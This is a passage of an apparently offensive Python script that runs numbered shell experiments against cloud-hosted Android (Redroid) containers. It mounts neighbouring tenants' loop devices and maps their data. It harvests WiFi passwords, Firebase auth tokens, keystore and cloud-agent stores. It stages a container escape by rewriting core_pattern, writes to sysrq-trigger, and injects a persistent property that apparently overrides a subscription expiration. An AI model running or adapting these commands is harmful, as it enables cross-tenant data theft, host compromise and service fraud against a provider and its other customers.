        await asyncio.sleep(DELAY)

        # EXP-053: f2fs specific — supernodes and features
        r = await shell(self.client, pad,
            "ls /sys/fs/f2fs/ 2>/dev/null; echo '---'; "
            "for dev in $(ls /sys/fs/f2fs/ 2>/dev/null); do "
            "  echo \"=== $dev ===\"; "
            "  cat /sys/fs/f2fs/$dev/features 2>/dev/null; echo; "
            "  cat /sys/fs/f2fs/$dev/segment_info 2>/dev/null | head -3; echo; "
            "done",
            "f2fs_info")
        self.record(53, "F", "f2fs filesystem details — per-device features", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-054: Try to mount neighbor loop devices
        r = await shell(self.client, pad,
            "# Find a loop device that ISN'T ours\n"
            "our_loops=$(cat /proc/mounts | grep loop | awk '{print $1}'); "
            "for lo in /dev/loop*; do "
            "  [ -b \"$lo\" ] || continue; "
            "  echo \"$our_loops\" | grep -q \"$lo\" && continue; "
            "  echo \"Trying to mount $lo...\"; "
            "  mkdir -p /tmp/neighbor_mount 2>/dev/null; "
            "  mount -o ro $lo /tmp/neighbor_mount 2>&1; "
            "  if [ $? -eq 0 ]; then "
            "    echo \"SUCCESS: $lo mounted!\"; "
            "    ls /tmp/neighbor_mount/ 2>/dev/null | head -10; "
            "    umount /tmp/neighbor_mount 2>/dev/null; "
            "    break; "
            "  else "
            "    echo \"FAILED: $lo\"; "
            "  fi; "
            "done | head -30",
            "mount_neighbor_loop")
        self.record(54, "F", "Mount neighbor loop device — cross-container filesystem access", {
            **r, "finding": "CROSS-CONTAINER ACCESS" if "SUCCESS" in r["stdout"]
                else r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-055: dm-verity / verified boot status
        r = await shell(self.client, pad,
            "ls /dev/dm-* 2>/dev/null; echo '---'; "
            "cat /proc/device-mapper/dm-* 2>/dev/null | head -10; echo '---'; "
            "getprop ro.boot.verifiedbootstate 2>/dev/null; echo '---'; "
            "getprop ro.boot.vbmeta.device_state 2>/dev/null",
            "dm_verity")
        self.record(55, "F", "dm-verity / verified boot status", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-056: zram devices — compressed memory analysis
        r = await shell(self.client, pad,
            "ls /dev/zram* 2>/dev/null; echo '---'; "
            "cat /sys/block/zram0/disksize 2>/dev/null; echo '---'; "
            "cat /sys/block/zram0/mem_used_total 2>/dev/null; echo '---'; "
            "cat /sys/block/zram0/num_reads 2>/dev/null",
            "zram")
        self.record(56, "F", "zram devices — compressed memory blocks", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-057: Disk stats — IO patterns reveal neighbor activity
        r = await shell(self.client, pad,
            "cat /proc/diskstats 2>/dev/null | grep -v ' 0 0 0 0' | head -30",
            "diskstats")
        active_disks = r["stdout"].count("\n") + 1 if r["stdout"].strip() else 0
        self.record(57, "F", "Disk stats — active IO patterns (neighbor activity indicator)", {
            **r, "finding": f"Active disks with IO: {active_disks}"
        })
        await asyncio.sleep(DELAY)

        # EXP-058: /proc/swaps — swap device enumeration
        r = await shell(self.client, pad,
            "cat /proc/swaps 2>/dev/null",
            "swaps")
        self.record(58, "F", "/proc/swaps — swap partition/file enumeration", {
            **r, "finding": r["stdout"][:200] if r["stdout"] else "NO SWAP"
        })
        await asyncio.sleep(DELAY)

        # EXP-059: ioctl capability — can we manipulate loop devices?
        r = await shell(self.client, pad,
            "losetup -a 2>/dev/null | head -20; echo '---'; "
            "losetup 2>&1 | head -5",
            "losetup")
        self.record(59, "F", "losetup — loop device configuration capability", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "losetup not available"
        })
        await asyncio.sleep(DELAY)

        # EXP-060: Block device major:minor mapping
        r = await shell(self.client, pad,
            "cat /proc/devices 2>/dev/null",
            "major_minor")
        self.record(60, "F", "/proc/devices — major:minor device mapping", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY G: Kernel & /sys Probing (Exp 61-70)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_g_kernel_sys_probing(self):
        print("\n" + "─" * 100)
        print("  CATEGORY G: Kernel & /sys Probing (EXP 61-70)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-061: Kernel version and build info
        r = await shell(self.client, pad,
            "uname -a 2>/dev/null; echo '---'; "
            "cat /proc/version 2>/dev/null",
            "kernel_version")
        self.record(61, "G", "Kernel version & build information", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-062: Kernel config — check for escape-relevant options
        r = await shell(self.client, pad,
            "zcat /proc/config.gz 2>/dev/null | grep -iE "
            "'CONFIG_BPF|CONFIG_USER_NS|CONFIG_CGROUP|CONFIG_OVERLAY|CONFIG_SECCOMP|CONFIG_SELINUX' "
            "| head -20; "
            "echo '---'; "
            "cat /boot/config-$(uname -r) 2>/dev/null | grep -iE 'BPF|USER_NS' | head -10",
            "kernel_config")
        self.record(62, "G", "Kernel config — BPF/NS/cgroup/seccomp options", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-063: eBPF availability and programs
        r = await shell(self.client, pad,
            "ls /sys/fs/bpf/ 2>/dev/null; echo '---'; "
            "cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null; echo '---'; "
            "cat /proc/sys/net/core/bpf_jit_enable 2>/dev/null",
            "ebpf")
        self.record(63, "G", "eBPF availability — jit/unprivileged status", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-064: /sys/kernel/security — LSM stack
        r = await shell(self.client, pad,
            "cat /sys/kernel/security/lsm 2>/dev/null; echo '---'; "
            "ls /sys/kernel/security/ 2>/dev/null; echo '---'; "
            "cat /sys/kernel/security/apparmor/profiles 2>/dev/null | wc -l",
            "lsm_stack")
        self.record(64, "G", "LSM stack — security module enumeration", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-065: /proc/kallsyms — kernel symbol table (root can read)
        r = await shell(self.client, pad,
            "cat /proc/kallsyms 2>/dev/null | wc -l; echo '---'; "
            "cat /proc/kallsyms 2>/dev/null | grep -i 'bpf_prog_load\\|sys_call_table\\|commit_creds' | head -5",
            "kallsyms")
        self.record(65, "G", "Kernel symbols — sys_call_table / commit_creds addresses", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-066: /proc/sys/kernel/ writable params
        r = await shell(self.client, pad,
            "for f in core_pattern shmmax shmall msgmax pid_max threads-max randomize_va_space; do "
            "  val=$(cat /proc/sys/kernel/$f 2>/dev/null); "
            "  echo \"$f = $val\"; "
            "done",
            "sysctl_kernel")
        self.record(66, "G", "/proc/sys/kernel/ — tunable parameters", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-067: Kernel modules loaded
        r = await shell(self.client, pad,
            "cat /proc/modules 2>/dev/null | head -30; echo '---'; "
            "lsmod 2>/dev/null | head -20",
            "lsmod")
        self.record(67, "G", "Loaded kernel modules", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-068: /sys/devices/system/ — hardware topology
        r = await shell(self.client, pad,
            "ls /sys/devices/system/ 2>/dev/null; echo '---'; "
            "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null; echo '---'; "
            "cat /proc/cpuinfo 2>/dev/null | head -20",
            "hw_topology")
        self.record(68, "G", "Hardware topology — CPU/device system layout", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-069: ASLR and KASLR status
        r = await shell(self.client, pad,
            "cat /proc/sys/kernel/randomize_va_space 2>/dev/null; echo '---'; "
            "cat /proc/sys/kernel/kptr_restrict 2>/dev/null; echo '---'; "
            "cat /proc/sys/kernel/dmesg_restrict 2>/dev/null",
            "aslr_kaslr")
        self.record(69, "G", "ASLR/KASLR/kptr_restrict/dmesg_restrict status", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-070: dmesg — kernel log messages (host-level)
        r = await shell(self.client, pad,
            "dmesg 2>/dev/null | tail -30; echo '---'; "
            "dmesg 2>/dev/null | grep -iE 'container\\|docker\\|redroid\\|cgroup\\|loop' | tail -10",
            "dmesg")
        self.record(70, "G", "dmesg — kernel logs with container/redroid references", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY H: Network Namespace & Interface Mapping (Exp 71-80)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_h_network_namespace(self):
        print("\n" + "─" * 100)
        print("  CATEGORY H: Network Namespace & Interface Mapping (EXP 71-80)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-071: Network interfaces
        r = await shell(self.client, pad,
            "ip link show 2>/dev/null || ifconfig -a 2>/dev/null",
            "net_ifaces")
        self.record(71, "H", "Network interfaces — all links visible", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-072: IP addresses and routing table
        r = await shell(self.client, pad,
            "ip addr show 2>/dev/null | head -30; echo '---'; "
            "ip route show 2>/dev/null",
            "ip_routes")
        self.record(72, "H", "IP addresses & routing table", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-073: ARP table — cached neighbor MACs
        r = await shell(self.client, pad,
            "ip neigh show 2>/dev/null; echo '---'; "
            "cat /proc/net/arp 2>/dev/null",
            "arp_table")
        self.record(73, "H", "ARP table — cached neighbor addresses from host FS", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-074: /proc/net/ — network statistics and connections
        r = await shell(self.client, pad,
            "cat /proc/net/tcp 2>/dev/null | head -20; echo '---'; "
            "cat /proc/net/tcp6 2>/dev/null | head -10; echo '---'; "
            "cat /proc/net/udp 2>/dev/null | head -10",
            "proc_net")
        self.record(74, "H", "/proc/net/ — TCP/UDP connection table", {
            **r, "finding": f"TCP connections: {max(0, r['stdout'].count(chr(10))-3)}" if r["stdout"] else "NO ACCESS"
        })
        await asyncio.sleep(DELAY)

        # EXP-075: Network namespace ID comparison across PIDs
        r = await shell(self.client, pad,
            "for p in $(ls -d /proc/[0-9]* 2>/dev/null | head -100); do "
            "  readlink $p/ns/net 2>/dev/null; "
            "done | sort | uniq -c | sort -rn | head -10",
            "netns_compare")
        self.record(75, "H", "Network namespace count — unique net namespaces", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-076: /proc/net/dev — interface traffic stats
        r = await shell(self.client, pad,
            "cat /proc/net/dev 2>/dev/null",
            "net_dev")
        self.record(76, "H", "/proc/net/dev — interface traffic statistics", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-077: DNS configuration 
        r = await shell(self.client, pad,
            "cat /etc/resolv.conf 2>/dev/null; echo '---'; "
            "getprop net.dns1 2>/dev/null; echo '---'; "
            "getprop net.dns2 2>/dev/null; echo '---'; "
            "getprop ro.boot.redroid_net_dns1 2>/dev/null; echo '---'; "
            "getprop ro.boot.redroid_net_dns2 2>/dev/null",
            "dns_config")
        self.record(77, "H", "DNS configuration — Redroid DNS servers", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-078: iptables rules (full)
        r = await shell(self.client, pad,
            "iptables -L -n -v 2>/dev/null | head -30; echo '---'; "
            "iptables -t nat -L -n -v 2>/dev/null | head -20; echo '---'; "
            "iptables -t mangle -L -n -v 2>/dev/null | head -10",
            "iptables_full")
        self.record(78, "H", "iptables — full firewall rules (filter/nat/mangle)", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-079: Bridge/veth interfaces — container networking topology
        r = await shell(self.client, pad,
            "brctl show 2>/dev/null; echo '---'; "
            "ip link show type veth 2>/dev/null; echo '---'; "
            "ip link show type bridge 2>/dev/null; echo '---'; "
            "ls /sys/class/net/ 2>/dev/null",
            "bridge_veth")
        self.record(79, "H", "Bridge/veth interfaces — container network topology", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-080: /proc/net/unix — Unix domain sockets (inter-container IPC)
        r = await shell(self.client, pad,
            "cat /proc/net/unix 2>/dev/null | wc -l; echo '---'; "
            "cat /proc/net/unix 2>/dev/null | grep -v '@@' | head -30",
            "unix_sockets")
        self.record(80, "H", "Unix domain sockets — inter-container IPC channels", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY I: Credential & Data Harvesting from Neighbors (Exp 81-90)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_i_credential_harvest(self):
        print("\n" + "─" * 100)
        print("  CATEGORY I: Credential & Data Harvesting from Neighbors (EXP 81-90)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-081: Google account info on our container
        r = await shell(self.client, pad,
            "dumpsys account 2>/dev/null | head -30",
            "accounts")
        self.record(81, "I", "Google account enumeration — dumpsys account", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-082: Chrome databases present
        r = await shell(self.client, pad,
            "ls -la /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null | head -20",
            "chrome_dbs")
        self.record(82, "I", "Chrome profile databases enumeration", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO CHROME DATA"
        })
        await asyncio.sleep(DELAY)

        # EXP-083: GMS databases — trust signals
        r = await shell(self.client, pad,
            "ls -la /data/data/com.google.android.gms/databases/ 2>/dev/null | head -30",
            "gms_dbs")
        self.record(83, "I", "GMS databases — device trust score stores", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO GMS DATA"
        })
        await asyncio.sleep(DELAY)

        # EXP-084: WiFi saved networks
        r = await shell(self.client, pad,
            "cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null | head -40; "
            "echo '---'; "
            "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | head -40",
            "wifi_configs")
        self.record(84, "I", "WiFi saved networks — SSID/password extraction", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO WIFI CONFIG"
        })
        await asyncio.sleep(DELAY)

        # EXP-085: Keystore contents
        r = await shell(self.client, pad,
            "ls -la /data/misc/keystore/ 2>/dev/null; echo '---'; "
            "ls -la /data/misc/keystore/user_0/ 2>/dev/null | head -20",
            "keystore")
        self.record(85, "I", "Keystore — hardware-backed key storage enumeration", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO KEYSTORE"
        })
        await asyncio.sleep(DELAY)

        # EXP-086: SharedPreferences of all apps (sensitive configs)
        r = await shell(self.client, pad,
            "find /data/data/*/shared_prefs/ -name '*.xml' 2>/dev/null | wc -l; echo '---'; "
            "find /data/data/*/shared_prefs/ -name '*.xml' 2>/dev/null | head -30",
            "shared_prefs")
        self.record(86, "I", "SharedPreferences — all app config XML files", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-087: Package manager — installed apps with signatures
        r = await shell(self.client, pad,
            "pm list packages -f 2>/dev/null | head -30; echo '---'; "
            "pm list packages -3 2>/dev/null",
            "packages")
        self.record(87, "I", "Installed packages — system + third-party apps", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-088: MMKV files — cloud agent key-value stores
        r = await shell(self.client, pad,
            "ls -la /data/data/com.cloud.rtcgesture/files/mmkv/ 2>/dev/null; echo '---'; "
            "xxd /data/data/com.cloud.rtcgesture/files/mmkv/cloud-api 2>/dev/null | head -30",
            "mmkv_stores")
        self.record(88, "I", "MMKV cloud-api store — binary key-value dump", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-089: Firebase installation ID & auth token
        r = await shell(self.client, pad,
            "cat /data/data/com.cloud.rtcgesture/files/PersistedInstallation*.json 2>/dev/null",
            "firebase_id")
        self.record(89, "I", "Firebase installation ID & auth JWT token", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-090: Try to access neighbor /data via mounted neighbor loop
        r = await shell(self.client, pad,
            "# Find neighbor's data loop device\n"
            "our_backing=$(cat /sys/block/$(mount | grep '/data ' | awk '{print $1}' | "
            "  sed 's|/dev/||')/loop/backing_file 2>/dev/null); "
            "echo \"Our data backing: $our_backing\"; "
            "# List ALL loop backing files to find neighbors\n"
            "for lo in $(ls /sys/block/ 2>/dev/null | grep loop); do "
            "  back=$(cat /sys/block/$lo/loop/backing_file 2>/dev/null); "
            "  [ -n \"$back\" ] && [ \"$back\" != \"$our_backing\" ] && "
            "  echo \"NEIGHBOR: /dev/$lo → $back\"; "
            "done | head -20",
            "neighbor_data_access")
        self.record(90, "I", "Neighbor data identification — loop device cross-reference", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY J: Advanced Escape Chains & Persistence (Exp 91-100)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_j_advanced_chains(self):
        print("\n" + "─" * 100)
        print("  CATEGORY J: Advanced Escape Chains & Persistence (EXP 91-100)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-091: core_pattern → host code execution via crash
        r = await shell(self.client, pad,
            "# Read current core_pattern\n"
            "cat /proc/sys/kernel/core_pattern; echo '---'; "
            "# Set up host-level marker file via core_pattern\n"
            "echo '|/system/bin/sh -c \"echo ESCAPED_$(date +%s) > /data/escape_marker\"' "
            "> /proc/sys/kernel/core_pattern 2>&1; "
            "cat /proc/sys/kernel/core_pattern; echo '---'; "
            "# Verify marker file creation capability\n"
            "echo 'CORE_PATTERN_ESCAPE_STAGED'",
            "core_escape_chain")
        self.record(91, "J", "core_pattern escape chain — host code execution via crash handler", {
            **r, "finding": "STAGED" if "STAGED" in r["stdout"] else r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-092: sysrq-trigger → crash/reboot/sync
        r = await shell(self.client, pad,
            "# List available sysrq functions\n"
            "cat /proc/sys/kernel/sysrq 2>/dev/null; echo '---'; "
            "# Test sync command (safe - forces filesystem sync)\n"
            "echo s > /proc/sysrq-trigger 2>&1; echo \"sync_exit=$?\"; "
            "# Test show-memory (safe)\n"
            "echo m > /proc/sysrq-trigger 2>&1; echo \"mem_exit=$?\"",
            "sysrq_ops")
        self.record(92, "J", "sysrq-trigger operations — sync/memory/debug", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-093: /proc/sys/kernel/ write capabilities
        r = await shell(self.client, pad,
            "# Test various kernel param writes\n"
            "for param in shmmax msgmax pid_max threads-max; do "
            "  orig=$(cat /proc/sys/kernel/$param 2>/dev/null); "
            "  echo \"$param=$orig (attempting write...)\"; "
            "  echo $orig > /proc/sys/kernel/$param 2>&1; "
            "  echo \"  write_exit=$?\"; "
            "done",
            "sysctl_write")
        self.record(93, "J", "Kernel parameter write test — sysctl writability", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-094: Persistence via init.rc script injection
        r = await shell(self.client, pad,
            "ls /system/etc/init/ 2>/dev/null | head -20; echo '---'; "
            "ls /vendor/etc/init/ 2>/dev/null | head -20; echo '---'; "
            "# Check if system partition is writable\n"
            "touch /system/test_write 2>&1; echo \"system_write=$?\"; "
            "rm /system/test_write 2>/dev/null; "
            "touch /vendor/test_write 2>&1; echo \"vendor_write=$?\"; "
            "rm /vendor/test_write 2>/dev/null",
            "init_persist")
        self.record(94, "J", "init.rc persistence — system/vendor write capability", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-095: /data/local.prop — persistent property injection
        r = await shell(self.client, pad,
            "cat /data/local.prop 2>/dev/null; echo '---'; "
            "echo 'persist.sys.cloud.expiration.override=9999999999999' >> /data/local.prop 2>&1; "
            "echo \"write_exit=$?\"; "
            "cat /data/local.prop 2>/dev/null | tail -5",
            "local_prop")
        self.record(95, "J", "/data/local.prop — persistent property file injection", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-096: Protobuf property store direct manipulation
        r = await shell(self.client, pad,
            "ls -la /data/property/ 2>/dev/null; echo '---'; "
            "xxd /data/property/persistent_properties 2>/dev/null | head -30; echo '---'; "
            "# Check for persist.sys.cloud.* in binary\n"
            "strings /data/property/persistent_properties 2>/dev/null | grep -i 'cloud\\|expir' | head -10",
            "protobuf_direct")
        self.record(96, "J", "Protobuf property store — direct binary manipulation", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-097: gs_daemon.sh — cloud agent daemon script analysis
        r = await shell(self.client, pad,
            "cat /data/data/com.cloud.rtcgesture/files/sh/gs_daemon.sh 2>/dev/null",
            "gs_daemon")
        self.record(97, "J", "gs_daemon.sh — cloud agent daemon script contents", {
            **r, "finding": r["stdout"][:500] if r["stdout"] else "NOT READABLE"
        })
        await asyncio.sleep(DELAY)

        # EXP-098: Boot scripts — what runs at container startup
        r = await shell(self.client, pad,
            "cat /init.rc 2>/dev/null | head -50; echo '====='; "
            "cat /init.environ.rc 2>/dev/null | head -20",
            "boot_scripts")
        self.record(98, "J", "init.rc / init.environ.rc — container boot sequence", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-099: Cross-container data write test
        r = await shell(self.client, pad,
            "# Write a marker file to /data that could be detected\n"
            "echo 'ESCAPE_MARKER_EXP99_'$(date +%s) > /data/escape_proof.txt 2>&1; "
            "cat /data/escape_proof.txt 2>/dev/null; echo '---'; "
            "# Check if we can write to /dev/shm (shared memory)\n"
            "echo 'SHM_TEST' > /dev/shm/escape_test 2>&1; "
            "cat /dev/shm/escape_test 2>/dev/null; echo '---'; "
            "# Check if we can reach outside /data\n"
            "ls / 2>/dev/null | head -15",
            "cross_container_write")
        self.record(99, "J", "Cross-container data write — marker file persistence", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-100: Full escape summary — combine all vectors into capability map
        r = await shell(self.client, pad,
            "echo '=== FINAL ESCAPE CAPABILITY MAP ==='; "
            "echo 'sysrq: '$(test -w /proc/sysrq-trigger && echo WRITABLE || echo BLOCKED); "
            "echo 'core_pattern: '$(test -w /proc/sys/kernel/core_pattern && echo WRITABLE || echo BLOCKED); "
            "echo 'selinux: '$(getenforce 2>/dev/null || echo 'UNKNOWN'); "
            "echo 'uid: '$(id -u); "
            "echo 'capabilities: '$(cat /proc/self/status | grep CapEff | awk '{print $2}'); "
            "echo 'pid_ns: '$(readlink /proc/self/ns/pid); "
            "echo 'net_ns: '$(readlink /proc/self/ns/net); "
            "echo 'mnt_ns: '$(readlink /proc/self/ns/mnt); "
            "echo 'cgroup: '$(cat /proc/self/cgroup | head -1); "
            "echo 'kernel: '$(uname -r); "
            "echo 'loops: '$(ls /sys/block/ | grep -c loop); "
            "echo 'procs: '$(ls -d /proc/[0-9]* | wc -l); "
            "echo 'data_write: '$(test -w /data && echo YES || echo NO); "
            "echo 'system_write: '$(test -w /system && echo YES || echo NO); "
            "echo 'neighbors_found: " + str(len(self.neighbors_found)) + "'; "
            "echo '=== END ==='",
            "final_capability_map")
        self.record(100, "J", "FINAL ESCAPE CAPABILITY MAP — all vectors combined", {
            **r, "finding": r["stdout"][:500],
            "neighbors_discovered": self.neighbors_found
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # FINAL REPORT
    # ═══════════════════════════════════════════════════════════════════════
    async def final_report(self):
        print("\n" + "=" * 100)
        print("  FINAL REPORT — 100 EXPERIMENTS COMPLETE")
        print("=" * 100)

        # Categorize results
        categories = defaultdict(list)
        for exp_id, data in sorted(self.results.items()):
            categories[data["category"]].append(data)

        cat_names = {
            "A": "Container Escape Vector Probing",
            "B": "Host Filesystem Neighbor Discovery",
            "C": "Process & PID Namespace Mapping",
            "D": "Cgroup Hierarchy Traversal",
            "E": "Mount Namespace & Overlay Analysis",
            "F": "Block Device & Loop Mount Enumeration",
            "G": "Kernel & /sys Probing",
            "H": "Network Namespace & Interface Mapping",
            "I": "Credential & Data Harvesting",
            "J": "Advanced Escape Chains & Persistence"
        }

        for cat in sorted(categories.keys()):
            exps = categories[cat]
            print(f"\n  Category {cat}: {cat_names.get(cat, 'Unknown')} ({len(exps)} experiments)")
            for exp in exps:
                finding = str(exp["result"].get("finding", ""))[:100]
                print(f"    EXP-{exp['id']:03d}: {exp['title']}")
                print(f"             {finding}")

        print(f"\n  NEIGHBORS DISCOVERED VIA HOST FILESYSTEM: {len(self.neighbors_found)}")
        for n in self.neighbors_found[:50]:
            print(f"    → {n}")

        print(f"\n  Total Experiments: {len(self.results)}")
        print(f"  Target Device: {EXPIRED} (EXPIRED)")
        print(f"  Secondary Device: {ACTIVE} (ACTIVE)")

        # Save full JSON report
        report = {
            "experiment_run": {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "primary_target": EXPIRED,
                "secondary_target": ACTIVE,
                "total_experiments": len(self.results),
                "neighbors_discovered": self.neighbors_found
            },
            "experiments": self.results
        }
        with open(OUTPUT_FILE, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n  Full report saved to: {OUTPUT_FILE}")
        print("=" * 100)


# ─── Main ───────────────────────────────────────────────────────────────────
async def main():
    runner = ExperimentRunner()
    await runner.run_all()

if __name__ == "__main__":
    asyncio.run(main())
